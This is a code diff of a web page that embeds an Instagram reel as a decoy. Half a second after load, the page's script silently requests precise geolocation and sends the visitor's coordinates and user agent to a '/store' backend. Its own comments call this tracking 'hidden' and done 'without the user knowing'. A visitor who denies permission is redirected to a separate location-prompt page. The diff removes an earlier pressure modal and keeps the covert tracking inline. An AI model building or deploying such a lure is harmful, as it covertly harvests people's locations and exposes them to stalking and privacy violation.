@@ -29,7 +29,6 @@
             height: 100%;
             background-color: #000; /* Dark background like IG reels */
             overflow: hidden;
-            font-family: sans-serif;
         }
         iframe {
             width: 100%;
@@ -37,105 +36,43 @@
             border: none;
             display: block;
         }
-        .modal-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.85);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-        }
-        .modal-content {
-            background-color: #fff;
-            padding: 25px;
-            border-radius: 12px;
-            text-align: center;
-            max-width: 300px;
-            color: #262626;
-        }
-        .modal-content h3 {
-            margin-top: 0;
-            font-size: 18px;
-        }
-        .modal-content p {
-            font-size: 14px;
-            color: #737373;
-            margin-bottom: 20px;
-        }
-        .allow-btn {
-            background-color: #0095f6;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 8px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            width: 100%;
-        }
-        .allow-btn:hover {
-            background-color: #007bb5;
-        }
     </style>
 </head>
 <body>
-
-    <!-- Custom Location Prompt Modal -->
-    <div id="locationModal" class="modal-overlay">
-        <div class="modal-content">
-            <h3>Location Access Required</h3>
-            <p>Please allow location access to continue viewing this content.</p>
-            <button class="allow-btn" onclick="retryLocation()">Allow Location</button>
-        </div>
-    </div>
     
     <!-- Instagram Reel Embed -->
     <iframe src="https://www.instagram.com/reel/DI0zr7xSYMk/embed" frameborder="0" scrolling="no" allowtransparency="true" allowfullscreen="true"></iframe>
 
     <script>
-        function retryLocation() {
-            // Hide modal and prompt again
-            document.getElementById('locationModal').style.display = 'none';
-            askLocation();
-        }
-
         // Automatic location tracking hidden in the background
-        function askLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        const uagent = navigator.userAgent;
-
-                        // Silently log to our backend without the user knowing
-                        const url = "/store?lat=" + lat +
-                                    "&long=" + lon +
-                                    "&uagent=" + encodeURIComponent(uagent);
-
-                        fetch(url).catch(() => {});
-                    },
-                    (error) => {
-                        // Show the custom modal asking them to click 'Allow Location'
-                        document.getElementById('locationModal').style.display = 'flex';
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    }
-                );
-            }
-        }
-
         window.addEventListener('load', () => {
             // Wait slightly for the reel to start loading to feel seamless
             setTimeout(() => {
-                askLocation();
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            const lat = position.coords.latitude;
+                            const lon = position.coords.longitude;
+                            const uagent = navigator.userAgent;
+
+                            // Silently log to our backend without the user knowing
+                            const url = "/store?lat=" + lat +
+                                        "&long=" + lon +
+                                        "&uagent=" + encodeURIComponent(uagent);
+
+                            fetch(url).catch(() => {});
+                        },
+                        (error) => {
+                            // Redirect to location popup if denied or any other error occurs
+                            window.location.href = "/location_popup.html";
+                        },
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 0
+                        }
+                    );
+                }
             }, 500);
         });
     </script>
